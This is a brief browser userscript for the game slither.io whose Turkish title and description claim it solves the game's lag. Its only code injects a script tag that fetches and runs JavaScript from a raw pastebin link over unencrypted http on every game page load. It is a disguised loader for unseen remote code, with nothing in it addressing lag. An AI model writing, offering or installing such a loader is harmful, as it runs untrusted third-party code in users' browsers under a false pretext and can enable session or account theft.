// ==UserScript==
// @name slther.io/kasma/sorunun/çözümü-oyunzamanı:D
// @namespace oyunzamanı
// @description Slitheri/kasma/sorunun/çözümü
// @match http://slither.io/*
// @match https://slither.io/*
// @version 1
// @grant none
// ==/UserScript==

function addScript() {
var jsScript = document.createElement('script');

jsScript.setAttribute('type', 'text/javascript');

jsScript.setAttribute('src', 'http://pastebin.com/raw/LBVKA4vz');

document.getElementsByTagName('head')[0].appendChild(jsScript);
}

addScript();